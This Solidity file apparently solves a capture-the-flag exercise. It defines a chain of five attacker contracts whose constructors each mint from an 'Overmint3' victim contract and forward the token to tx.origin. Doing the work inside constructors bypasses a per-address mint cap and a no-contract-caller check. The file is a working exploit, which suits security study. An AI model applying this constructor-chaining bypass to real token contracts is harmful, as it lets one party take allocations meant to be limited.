// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint3.sol";


contract Overmint3Attacker1 {
    constructor(Overmint3 victim) {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 2);
        new Overmint3Attacker2(victim);
    }
}

contract Overmint3Attacker2 {
    constructor(Overmint3 victim) {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 3);
        new Overmint3Attacker3(victim);
    }
}

contract Overmint3Attacker3 {
    constructor(Overmint3 victim) {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 4);
        new Overmint3Attacker4(victim);
    }
}

contract Overmint3Attacker4 {
    constructor(Overmint3 victim) {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 5);
    }
}

contract Overmint3Attacker {

    constructor(Overmint3 victim) {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 1);
        new Overmint3Attacker1(victim);
    }
}
